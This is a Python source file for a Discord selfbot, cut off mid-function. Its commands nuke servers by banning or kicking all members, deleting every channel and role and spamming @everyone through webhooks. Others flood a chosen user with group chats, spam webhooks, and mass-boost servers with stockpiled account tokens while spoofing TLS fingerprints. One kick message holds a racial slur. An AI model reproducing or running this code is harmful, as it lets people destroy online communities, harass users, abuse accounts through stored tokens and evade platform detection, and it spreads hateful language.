        members = await guild.fetch_members()
        for member in members:
            if member.id in [author_id, bot_id]:  # Don't kick yourself or the bot
                continue
            try:
                await member.ban(reason="massban HAHA")
            except Exception as e:
                print(f"Error kicking {member}: {e}")

        await ctx.send("<:white_arrow:1290693789824061461> banned all members from the server.")

    @commands.command(name="masschannel",aliases=['massch','chmass'])
    async def masschannel(self, ctx, name: str):
        await ctx.message.delete()
        guild = ctx.guild
        for i in range(100):
            await guild.create_text_channel(name=name)

    @commands.command(name="massvc")
    async def massvc(self, ctx, name: str):
        await ctx.message.delete()
        guild = ctx.guild
        for i in range(100):
            await guild.create_voice_channel(name=name)

    @commands.command(name="deleteroles",aliases=['delroles','delr'])
    async def deleteroles(self, ctx):
        await ctx.message.delete()
        guild = ctx.guild
        for role in guild.roles:
            try:
                await role.delete()
            except:
                pass
        await ctx.send("**<:white_arrow:1290693789824061461> All roles has been deleted succesfully**")

    @commands.command(name="deletechannels",aliases=['delchannels','delch','channelsdel'])
    async def deletechannels(self, ctx):
        await ctx.message.delete()
        guild = ctx.guild
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                pass
            
    @commands.command()
    async def nickall(self, ctx, *, nickname: str):
        await ctx.message.delete()
        guild = ctx.guild
        if guild:
            for member in guild.members:
                if member != ctx.guild.owner and member != self.bot.user:
                    try:
                        await member.edit(nick=nickname)
                    except:
                        pass
            await ctx.send(f"<:white_arrow:1290693789824061461> **Changed everyone's nickname to {nickname}**")

    @commands.command()
    async def gcspam(self, ctx, user_id: int, count: int):
        await ctx.message.delete()

        token = self.bot.http.token
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
        }

        success = 0  # Initialize the success counter
        
        async with aiohttp.ClientSession(headers=headers) as session:
            for _ in range(count):  # Loop to create the specified number of group chats
                payload = {"recipients": []}
                async with session.post("https://discord.com/api/v10/users/@me/channels", json=payload) as response:
                    if response.status == 200:
                        data = await response.json()
                        channel_id = data["id"]
                        add_payload = {"user_id": str(user_id)}
                        async with session.put(f"{self.api_base_url}/channels/{channel_id}/recipients/{user_id}", json=add_payload) as add_response:
                            if add_response.status == 204:
                                success += 1  # Increment success counter
                                async with session.delete(f"{self.api_base_url}/channels/{channel_id}") as leave_response:
                                    if leave_response.status != 204:
                                        pass
        
        await ctx.send(f"**<:white_arrow:1290693789824061461> GC spam completed!** Created and left a total of **{success}** group chats.")

    @commands.command(aliases=['nukez','zzz'])
    async def kill(self, ctx):
        await ctx.message.delete()
        if not ctx.guild:
            return
        await ctx.send("**Are you sure you want to nuke the server?**\nType `y` to confirm or `n` to cancel.")
        def check(msg):
            return msg.author == ctx.author and msg.channel == ctx.channel and msg.content.lower() in ["y", "n"]
        try:
            msg = await self.bot.wait_for("message", timeout=15.0, check=check)
            if msg.content.lower() == "y":
                await ctx.send("**Nuke confirmed...!** ")
                await self.delete_all_channels(ctx.guild)
                await self.kick_all(ctx.guild)
                await self.delete_all_roles(ctx.guild)
                tasks = [self.create_channel(ctx.guild) for _ in range(50)]
                await asyncio.gather(*tasks)
            else:
                await ctx.send("❌ **Nuke canceled.**",delete_after=5)
        except asyncio.TimeoutError:
            await ctx.send("⏳ **Confirmation timed out.** Nuke canceled.",delete_after=5)        

    @commands.command(name="webhookspam", aliases=["wspam", "whspam","webspam","whookspam"])
    async def webhook_spam(self, ctx, webhook_url: str, amount: int):
        await ctx.message.delete()
        if amount <= 0:
            return await senderror(ctx, "Error", "Please give a positive number of counts")

        try:
            # Prompt user to select spam type
            prompt_msg = await ctx.send(
                "**<:Discord_bots:1290700055514452121> SELECT WHICH TYPE OF MESSAGE YOU WANT TO SPAM :-**\n"
                "```[+] NORMAL MESSAGE - 1\n[+] EMBED MESSAGE - 2\n[+] NORMAL + EMBED - 3```"
                "\n<:white_arrow:1290693789824061461>**SELECT FROM 1,2 OR 3**\n"
                "<:white_arrow:1290693789824061461>**THIS CMD MAY HIT RATE LIMITS !**"
            )

            def check(m):
                return m.author == ctx.author and m.channel == ctx.channel

            # Wait for the user's choice
            user_choice = await self.bot.wait_for('message', check=check, timeout=30)
            await user_choice.delete()
            await prompt_msg.delete()

            # Process user's choice
            if user_choice.content == "1":
                prompt_msg2 = await ctx.send("**Enter the message you want to spam:**")
                normal_msg = await self.bot.wait_for('message', check=check, timeout=30)
                await normal_msg.delete()
                await prompt_msg2.delete()
                message = normal_msg.content

                async with aiohttp.ClientSession() as session:
                    for i in range(amount):
                        try:
                            async with session.post(webhook_url, json={"content": message}) as resp:
                                print(f"Sent message {message} ({i + 1}/{amount}) - Status: {resp.status}")
                            await asyncio.sleep(0.5)  # Add a delay
                        except Exception as e:
                            print(f"Failed to send message: {e}")
                            break

            elif user_choice.content == "2":
                prompt_msg2 = await ctx.send("**Enter the title of the embed:**")
                embed_title = await self.bot.wait_for('message', check=check, timeout=30)
                await embed_title.delete()
                await prompt_msg2.delete()

                prompt_msg3 = await ctx.send("**Enter the description of the embed:**")
                embed_description = await self.bot.wait_for('message', check=check, timeout=30)
                await embed_description.delete()
                await prompt_msg3.delete()

                embed_payload = {
                    "embeds": [
                        {
                            "title": embed_title.content,
                            "description": embed_description.content,
                            "color": 0xff0000
                        }
                    ]
                }

                async with aiohttp.ClientSession() as session:
                    for i in range(amount):
                        try:
                            async with session.post(webhook_url, json=embed_payload) as resp:
                                print(f"Sent embed ({i + 1}/{amount}) - Status: {resp.status}")
                            await asyncio.sleep(0.5)  # Add a delay
                        except Exception as e:
                            print(f"Failed to send embed: {e}")
                            break

            elif user_choice.content == "3":
                prompt_msg2 = await ctx.send("**Enter the normal message you want to spam:**")
                normal_msg = await self.bot.wait_for('message', check=check, timeout=30)
                await normal_msg.delete()
                await prompt_msg2.delete()
                message = normal_msg.content

                prompt_msg3 = await ctx.send("**Enter the title of the embed:**")
                embed_title = await self.bot.wait_for('message', check=check, timeout=30)
                await embed_title.delete()
                await prompt_msg3.delete()

                prompt_msg4 = await ctx.send("**Enter the description of the embed:**")
                embed_description = await self.bot.wait_for('message', check=check, timeout=30)
                await embed_description.delete()
                await prompt_msg4.delete()

                embed_payload = {
                    "content": message,
                    "embeds": [
                        {
                            "title": embed_title.content,
                            "description": embed_description.content,
                            "color": 0xff0000
                        }
                    ]
                }

                async with aiohttp.ClientSession() as session:
                    for i in range(amount):
                        try:
                            async with session.post(webhook_url, json=embed_payload) as resp:
                                print(f"Sent normal message + embed ({i + 1}/{amount}) - Status: {resp.status}")
                            await asyncio.sleep(0.5)  # Add a delay
                        except Exception as e:
                            print(f"Failed to send normal message + embed: {e}")
                            break
            else:
                await ctx.send("<:CROSS_TDG:1321149916201881683> Invalid choice. Operation cancelled.", delete_after=5)
                return

            await ctx.send("<:Tick:1290693799361777665> Spamming complete!", delete_after=10)
        except asyncio.TimeoutError:
            await ctx.send("<:CROSS_TDG:1321149916201881683> You took too long to respond. Operation cancelled.", delete_after=5)
        except Exception as e:
            print(f"Error: {e}")

    @commands.command(name="webhookdelete", aliases=["wdel", "whdel","webdel","whookdel"])
    async def webhook_delete(self, ctx, url: str):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.delete(url) as resp:
                    if resp.status == 204:
                        await send(ctx, "Webhook Delete", "Webhook successfully deleted.")
                    else:
                        await senderror(ctx,"Error", f"Failed to delete webhook. Status: {resp.status}")
        except Exception as e:
            await senderror(ctx,"Error" ,f"Something went wrong: {e}")

    async def delete_all_channels(self, guild):
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                pass

    async def kick_all(self, guild):
        bot_id = self.bot.user.id
        members = await guild.fetch_members()
        for member in members:
            if member.id in [bot_id]:
                continue
            try:
                await member.kick(reason="GOOD BYE NIGERS")
            except Exception as e:
                pass

    async def delete_all_roles(self, guild):
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except discord.Forbidden:
                    print(f"Missing permissions to delete role {role.name}")
                except discord.HTTPException:
                    print(f"Rate-limited, waiting...")
                    await asyncio.sleep(5)

    async def create_channel(self, guild):
        with open('config/nuker.json', 'r') as config_file:
            config = json.load(config_file)         
        for _ in range(50):      
            try:
                webhook_name = random.choice(config["webhook_names"]) 
                channel_name = random.choice(config["channel_names"]) 
                ch = await guild.create_text_channel(name=channel_name)
                webhook = await ch.create_webhook(name=webhook_name)
                await self.spam_webhook(webhook)
            except discord.HTTPException:
                print(f"Rate-limited on creating channel, waiting...")
                await asyncio.sleep(5)

    async def spam_webhook(self, webhook):
        with open('config/nuker.json', 'r') as config_file:
            config = json.load(config_file)               
        for _ in range(30):
            try:
                message = random.choice(config["nuke_messages"]) 
                await webhook.send(f"@everyone @here {message}")
            except discord.HTTPException:
                print(f"Rate-limited on webhook spam, waiting...")
                await asyncio.sleep(5)

class Boost(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def get_cookies(self) -> dict:
        try:
            response = requests.get("https://discord.com").cookies
            cookies = {
                "__dcfduid": response.get("__dcfduid"),
                "__sdcfduid": response.get("__sdcfduid"),
                "_cfuvid": response.get("_cfuvid"),
                "__cfruid": response.get("__cfruid"),
            }
            return cookies
        except Exception:
            return {}

    def ran_str(self, length=16):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def censor_token(self, token):
        return token[:10] + "..." + token[-5:]

    async def check_token(self, token):
        try:
            token = token.split(":")[2] if "@" in token else token            
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            data = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)

            if data.status_code == 200:
                return True
            else:
                return False
        except Exception as e:
            return False 
    async def join_with_token(self, token, invite):
        try:
            chrome = "126"
            fingerprint_dict = random.choice(fps)
            ja3 = fingerprint_dict["ja3"]
            user_agent = fingerprint_dict["user-agent"]
            x_super_properties = fingerprint_dict["x-super-properties"]

            session = tls_client.Session(
                client_identifier="chrome_" + chrome,
                random_tls_extension_order=True,
                ja3_string=ja3,
            )
            headers = {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "authorization": token,
                "content-type": "application/json",
                "origin": "https://discord.com",
                "referer": "https://discord.com",
                "sec-fetch-site": "same-origin",
                "user-agent": user_agent,
                "x-super-properties": x_super_properties,
            }
            join_data = {"session_id": self.ran_str()}
            response = session.post(
                f"https://discord.com/api/v9/invites/{invite}",
                headers=headers,
                json=join_data,
                cookies=self.get_cookies(),
            )
            if response.status_code == 200:
                return True, f"Joined using {self.censor_token(token)}"
            
            try:
                data = response.json()
            except:
                data = {}
            if "captcha_sitekey" in data or response.status_code in [400, 403]:
                return False, "captcha"
                
            return False, f"Failed to join (Status: {response.status_code})"
        except Exception:
            return False, "An error occurred during joining."

    async def boost_with_token(self, token, guild_id):
        session = tls_client.Session(client_identifier="chrome_126", random_tls_extension_order=True)
        headers = {"authorization": token, "content-type": "application/json"}
        response = session.get(
            "https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots",
            headers=headers, 
            cookies=self.get_cookies()
        )
        if response.status_code != 200:
            return False, f"Failed to fetch boosts {self.censor_token(token)} - {response.text}"
        boost_data = response.json()
        if not boost_data:
            return False, f"No boosts available {self.censor_token(token)}"
        applied_boosts = 0
        for boost in boost_data:
            if applied_boosts >= 2:
                break
            boost_id = boost["id"]
            payload = {"user_premium_guild_subscription_slot_ids": [boost_id]}
            boosted = session.put(
                f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions",
                json=payload,
                headers=headers
            )
            if boosted.status_code == 201:
                applied_boosts += 1
            else:
                return False, f"Failed to put boost {self.censor_token(token)} - {boosted.text}"
        if applied_boosts == 2:
            return True, f"Successfully boosted 2 times using {self.censor_token(token)}"
        else:
            return False, f"Only boosted {applied_boosts} times using {self.censor_token(token)}"


    @commands.command()
    async def boost(self, ctx, guild_invite: str, token_type: int, num_token: int):
        invite = guild_invite
        count = num_token
        type = token_type
        await ctx.message.delete()

        if type not in [1, 3]:
            return await senderror(ctx, "Error", "Invalid type! Use `1` for `1m_tokens.txt` or `3` for `3m_tokens.txt`.")       
        token_file = f"boost_tokens_data/{type}m_tokens.txt"

        try:
            async with aiofiles.open(token_file, mode="r") as f:
                lines = await f.readlines()
        except FileNotFoundError:
            return await senderror(ctx, "Error", f"Token file `{token_file}` not found.")

        all_tokens = [t.strip().split(":")[-1] for t in lines if t.strip()]
        tokens = all_tokens[:count]
        if not tokens:
            return await senderror(ctx, "Error", "No tokens available.")

        invite_code = invite.split("/")[-1]
        response = tls_client.Session().get(f"https://discord.com/api/v9/invites/{invite_code}")
        if response.status_code != 200:
            return await senderror(ctx, "Error", "Invalid invite link.")

        guild_id = response.json().get("guild", {}).get("id")
        if not guild_id:
            return await senderror(ctx, "Error", "Failed to retrieve guild ID from the invite.")
        
        if len(tokens) < count:
            return await send(ctx, "⚠️ Insufficient Tokens", f"Requested: {count}, Available: {len(tokens)}")

        prog_msg = await send(ctx, "🎁 Boosting Server", f"Starting to apply **{2 * count} boost(s)** to server ID: `{guild_id}`...\nThis might take a while ⏳") 
        joined_count = 0
        boosted_count = 0
        used_tokens = []
        messages = []

        captcha_count = 0
        for token in tokens:
            joined, join_msg = await self.join_with_token(token, invite_code)
            boosted = False
            boost_msg = "Skipped boosting (join failed)"
            
            if joined:
                joined_count += 1
                boosted, boost_msg = await self.boost_with_token(token, guild_id)
                if boosted:
                    boosted_count += 1
            elif join_msg == "captcha":
                captcha_count += 1
                join_msg = f"❌ Captcha encountered on {self.censor_token(token)}"
                boost_msg = "Skipped boosting (join failed due to captcha)"
            else:
                join_msg = f"❌ Failed to join on {self.censor_token(token)} ({join_msg})"

            used_tokens.append(token)
            messages.append(f"{join_msg}\n{boost_msg}")

            await asyncio.sleep(random.uniform(1, 3))

        # Save used tokens to a file
        used_tokens_file = "used_boost_tokens.txt"
        async with aiofiles.open(used_tokens_file, "w") as f:
            await f.write("\n".join(used_tokens))
            
        permanent_used_file = f"boost_tokens_data/{token_type}m_used.txt"
        try:
            async with aiofiles.open(permanent_used_file, "a") as f:
                await f.write("\n".join(used_tokens) + "\n")
        except:
            pass

        # Remove used tokens from the original file
        remaining_tokens = [t for t in all_tokens if t not in used_tokens]
        async with aiofiles.open(token_file, "w") as f:
            await f.write("\n".join(remaining_tokens))

        # Load webhook from config
        with open("config.json") as f:
            config = json.load(f)
        webhook_url = config.get("boosting_logs_webhook_url")

        if webhook_url:
            embed = discord.Embed(
                title="📈 Boosting Log",
                description=f"Captcha count: `{captcha_count}`" if captcha_count > 0 else "",
                color=0x00ffcc
            )
            embed.add_field(name="Invite Code", value=f"`{invite_code}`", inline=False)
            embed.add_field(name="Tokens Type", value=f"`{token_type}` month", inline=True)
            embed.add_field(name="Tokens Used", value=f"`{len(used_tokens)}`", inline=True)
            embed.add_field(name="Joined", value=f"`{joined_count}`", inline=True)
            embed.add_field(name="Boosted", value=f"`{boosted_count}`", inline=True)
            embed.set_footer(text=f"Powered by {selfbot_name} ")

            async with aiohttp.ClientSession() as session:
                with open(used_tokens_file, "rb") as file_data:
                    form = aiohttp.FormData()
                    form.add_field("file", file_data, filename=used_tokens_file)
                    form.add_field("payload_json", json.dumps({
                        "embeds": [embed.to_dict()]
                    }))
                    try:
                        await session.post(webhook_url, data=form)
                    except:
                        pass

        msg = (
            f"Invite code : `{invite_code}`\n"
            f"Tokens type : `{token_type}` month\n"
            f"Tokens used : `{len(used_tokens)}`\n"
            f"Joined : `{joined_count}`\n"
            f"Boosted : `{boosted_count}`"
        )
        if captcha_count > 0:
            if joined_count == 0:
                msg += f"\n\n❌ **Joining & Boosting failed due to captcha in tokens! Please use captcha-free (no cap) tokens or use OAuth boosting (`.aboost`).**"
            else:
                msg += f"\n\n⚠️ **Some tokens failed to join/boost due to captcha! Please use captcha-free (no cap) tokens or use OAuth boosting (`.aboost`).**"
            
        await prog_msg.delete()
        await send(ctx, "Boosting Complete", msg)

    @commands.command()
    async def spy(self, ctx):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"           
            f"<:SA_PepeDetective:1479807174627561492> | **Spy User** **:** **`{prefix}spy_user [user]`**\n"             
            f"<:SA_PepeDetective:1479807174627561492> | **Close Spy** **:** **`{prefix}close_spy [user]`**\n"
            f"<:SA_PepeDetective:1479807174627561492> | **Spy List** **:** **`{prefix}spy_list`**\n"
            f"<:SA_PepeDetective:1479807174627561492> | **Clear Spy** **:** **`{prefix}clear_spy`**\n"
            f"<:SA_PepeDetective:1479807174627561492> | **Spy Webhook** **:** **`{prefix}spy_webhook [url]`**\n"
                        f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__Spy User Commands__<:Titanz:1281243489635405827>", description)
        
    @commands.command()
    async def sniper(self, ctx):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"           
            f"<:sparkles_discord_nitro:1479808795898020012> | **Nitro Sniper** **:** **`{prefix}nitro_sniper [enable/disable]`**\n"             
            f"<:sparkles_discord_nitro:1479808795898020012> | **Nitro Webhook** **:** **`{prefix}nsniper_webhook [url]`**\n"
            f"<:GO_RedGiveaway:1479809121053179927> | **Giveaway Sniper** **:** **`{prefix}gwy_sniper [enable/disable]`**\n"
            f"<:GO_RedGiveaway:1479809121053179927> | **Giveaway Webhook** **:** **`{prefix}gsniper_webhook`**\n"
                        f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__Sniper Commands__<:Titanz:1281243489635405827>", description)
    
    @commands.command()
    async def btool(self, ctx):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"           
            f"<:emoji_1738476603350:1335492413153742961> | **Oauth boosting** **:** **`{prefix}aboost [guildid] [type] [count] <nick>`**\n"             
            f"<:emoji_1738476603350:1335492413153742961> | **Boost a srv** **:** **`{prefix}boost [invite] [type] [count]`**\n"
            f"<:emoji_1738476603350:1335492413153742961> | **Bot Invite Link** **:** **`{prefix}invite`**\n"
            f"<:emoji_1738476603350:1335492413153742961> | **Show Stock** **:** **`{prefix}checkstock`**\n"
            f"<:emoji_1738476603350:1335492413153742961> | **Check Tokens** **:** **`{prefix}checktokens [type]`**\n"
            f"<:emoji_1738476603350:1335492413153742961> | **Add Tokens** **:** **`{prefix}addtokens [type] [tokens]`**\n"
            f"<:emoji_1738476603350:1335492413153742961> | **Clean Duplicates** **:** **`{prefix}cleandup [type]`**\n"
            f"<:emoji_1738476603350:1335492413153742961> | **Clean invalids** **:** **`{prefix}cleaninvalid`**\n"
            f"<:emoji_1738476603350:1335492413153742961> | **Clean used** **:** **`{prefix}cleanused [type]`**\n"
            f"<:emoji_1738476603350:1335492413153742961> | **Give tokens from stock** **:** **`{prefix}give [type] [count]`**\n"
            f"<:emoji_1738476603350:1335492413153742961> | **Clear tokens** **:** **`{prefix}cleantokens [type]`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__Boost Tool Commands__<:Titanz:1281243489635405827>", description)


    @commands.command(aliases=['checkstock','showstock'])
    async def stock(self, ctx):
        await ctx.message.delete()
        stock_data = {}
        for type in [1, 3]:
            file_path = f"boost_tokens_data/{type}m_tokens.txt"
            used_file_path = f"boost_tokens_data/{type}m_used.txt"
            
            try:
                async with aiofiles.open(file_path, mode="r") as f:
                    tokens = await f.readlines()
                stock_data[f"{type}m"] = len([t.strip() for t in tokens if t.strip()])
            except FileNotFoundError:
                stock_data[f"{type}m"] = 0
            
            try:
                async with aiofiles.open(used_file_path, mode="r") as f:
                    used_tokens = await f.readlines()
                stock_data[f"{type}m_used"] = len(set([t.strip() for t in used_tokens if t.strip()]))
            except FileNotFoundError:
                stock_data[f"{type}m_used"] = 0
        
        invalid_file_path = "boost_tokens_data/invalid_tokens.txt"
        try:
            async with aiofiles.open(invalid_file_path, mode="r") as f:
                invalid_tokens = await f.readlines()
            stock_data["invalids"] = len([t.strip() for t in invalid_tokens if t.strip()])
        except FileNotFoundError:
            stock_data["invalids"] = 0
        
        result_message = (
            f"**Stock Availability**\n\n"
            f"**<:white_arrow:1290693789824061461>1 Month Tokens:** `{stock_data['1m']} tokens`\n"
            f"**<:white_arrow:1290693789824061461>3 Month Tokens:** `{stock_data['3m']} tokens`\n"
            f"**<:white_arrow:1290693789824061461>1 Month Used Tokens:** `{stock_data['1m_used']} tokens`\n"
            f"**<:white_arrow:1290693789824061461>3 Month Used Tokens:** `{stock_data['3m_used']} tokens`\n"
            f"**<:white_arrow:1290693789824061461>Invalid Tokens:** `{stock_data['invalids']} tokens`"
        )
        await send(ctx, "Tokens Stock Check", result_message)


    @commands.command()
    async def checktokens(self, ctx, type: int):
        await ctx.message.delete()
        if type not in [1, 3]:
            return await senderror(ctx, "Error", "Invalid type! Use `1` for 1-month tokens or `3` for 3-month tokens.","30")
        file_path = f"boost_tokens_data/{type}m_tokens.txt"
        try:
            async with aiofiles.open(file_path, mode="r") as f:
                tokens = await f.readlines()
            tokens = [t.strip() for t in tokens if t.strip()]
            if not tokens:
                return await senderror(ctx, "Check Tokens", f"No tokens available for {type}-month boosts.","30")
            msg=await send(ctx,"Boost Tokens Checker",f"**Count:** **`{len(tokens)}`**\n**Type:** **`{type} month`**\n**Status:** **`Checking...`**")
            valid_tokens = []
            invalid_tokens = []
            display_messages = []
            for token in tokens:
                original_format = token  # Store original format
                token = token.split(":")[-1]  # Extract only token if in "email:password:token" format
                is_valid = await self.check_token(token)
                censored_token = self.censor_token(original_format) 

                if is_valid:
                    valid_tokens.append(original_format)
                    display_messages.append(f":white_check_mark: `{censored_token}`")
                else:
                    invalid_tokens.append(original_format)
                    display_messages.append(f":x: `{censored_token}`")
                await asyncio.sleep(1)
            async with aiofiles.open(file_path, mode="w") as file:
                await file.write("\n".join(valid_tokens) + "\n")
            async with aiofiles.open("boost_tokens_data/invalid_tokens.txt", mode="w") as file:
                await file.write("\n".join(invalid_tokens) + "\n")
            chunks = [display_messages[i:i+20] for i in range(0, len(display_messages), 20)]
            for chunk in chunks:
                try:
                    await msg.delete()
                except:
                    pass
                await send(ctx, f"Boost Token Check\n**Type:** `{type} month`\n**Valid:** `{len(valid_tokens)}` \n**Invalid:** `{len(invalid_tokens)}`", f"\n".join(chunk))
        except FileNotFoundError:
            await send(ctx, "Error", f"The file for {type}-month tokens does not exist.","30")

    @commands.command()
    async def addtokens(self, ctx, type: int, *tokens):
        await ctx.message.delete()
        if type not in [1, 3]:
            return await senderror(ctx, "Error", "Invalid type! Use `1` for 1-month tokens or `3` for 3-month tokens.")

        file_path = f"boost_tokens_data/{type}m_tokens.txt"
        try:
            async with aiofiles.open(file_path, mode="r") as f:
                existing_tokens = {line.strip() for line in await f.readlines()}
        except FileNotFoundError:
            existing_tokens = set()
        new_tokens = set(t.strip() for t in tokens if t.strip()) - existing_tokens
        if not new_tokens:
            return await senderror(ctx, "Add Tokens", "No new tokens were added (duplicates detected).")
        async with aiofiles.open(file_path, mode="a") as f:
            await f.writelines(f"{token}\n" for token in new_tokens)
        await send(ctx, "Add Tokens", f":white_check_mark: Successfully added `{len(new_tokens)}` tokens to `{type}m_tokens.txt`.")

    @commands.command()
    async def cleandup(self, ctx, type: int):
        await ctx.message.delete()
        if type not in [1, 3]:
            return await senderror(ctx, "Error", "Invalid type! Use `1` for 1-month tokens or `3` for 3-month tokens.")

        file_path = f"boost_tokens_data/{type}m_tokens.txt"
        try:
            async with aiofiles.open(file_path, mode="r") as f:
                tokens = [line.strip() for line in await f.readlines() if line.strip()]
            if not tokens:
                return await senderror(ctx, "Clean Duplicates", "No tokens found in the file.")
            unique_tokens = list(set(tokens)) 
            removed_count = len(tokens) - len(unique_tokens)
            async with aiofiles.open(file_path, mode="w") as f:
                await f.writelines(f"{token}\n" for token in unique_tokens)
            await send(ctx, "Clean Duplicates", f":white_check_mark: Removed `{removed_count}` duplicate tokens. `{len(unique_tokens)}` unique tokens remain.")
        except FileNotFoundError:
            await send(ctx, "Error", f"The file for {type}-month tokens does not exist.")


    @commands.command()
    async def give(self, ctx, type: int, count: int):
        await ctx.message.delete()
        if type not in [1, 3]:
            return await ctx.send(":x: **Invalid type!** Use `1` for 1-month tokens or `3` for 3-month tokens.", delete_after=5)

        file_path = f"boost_tokens_data/{type}m_tokens.txt"

        try:
            async with aiofiles.open(file_path, mode="r") as f:
                tokens = await f.readlines()

            tokens = [t.strip() for t in tokens if t.strip()]
            if len(tokens) < count:
                return await ctx.send(f":x: **Not enough tokens available.** Only `{len(tokens)}` left.", delete_after=5)

            confirmation_msg = await ctx.send(f"**Are you sure you want to send `{count}` tokens from `{type}-month` stock here?**\n-# Reply with `yes` within **30 seconds** to confirm.")

            def check(m):
                return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() == "yes"

            try:
                reply = await self.bot.wait_for("message", check=check, timeout=30)
                await confirmation_msg.delete()
                await reply.delete()
            except asyncio.TimeoutError:
                await confirmation_msg.delete()
                return await ctx.send(":x: **Token send operation timed out.**", delete_after=5)

            tokens_to_send = tokens[:count]
            remaining_tokens = tokens[count:]

            async with aiofiles.open(file_path, mode="w") as f:
                await f.write("\n".join(remaining_tokens) + "\n")

            token_text = "\n".join(tokens_to_send)

            if len(token_text) <= 1900:
                await ctx.send(token_text)
            else:
                temp_path = f"boost_tokens_data/tokens.txt"
